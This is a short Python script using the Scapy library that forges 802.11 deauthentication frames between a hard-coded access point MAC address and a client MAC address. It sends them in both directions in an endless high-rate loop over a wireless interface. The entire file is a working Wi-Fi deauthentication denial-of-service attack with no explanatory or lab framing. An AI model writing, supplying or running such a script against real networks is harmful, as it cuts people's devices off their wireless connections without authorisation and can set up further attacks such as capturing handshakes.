from scapy.all import *
import time
#ap
frame = RadioTap()/Dot11(addr1 = '30:a1:fa:3c:b4:e6', addr2 ='54:35:30:e5:1a:cd', addr3 = '30:a1:fa:3c:b4:e6')/Dot11Deauth()
#client
frame1 = RadioTap()/Dot11(addr1 = '54:35:30:e5:1a:cd', addr2 ='30:a1:fa:3c:b4:e6', addr3 = '30:a1:fa:3c:b4:e6')/Dot11Deauth()
while True:
     sendp(frame, iface = 'wlp2s0', count = 100, inter = .001)
     sendp(frame1, iface = 'wlp2s0', count = 100, inter = .001)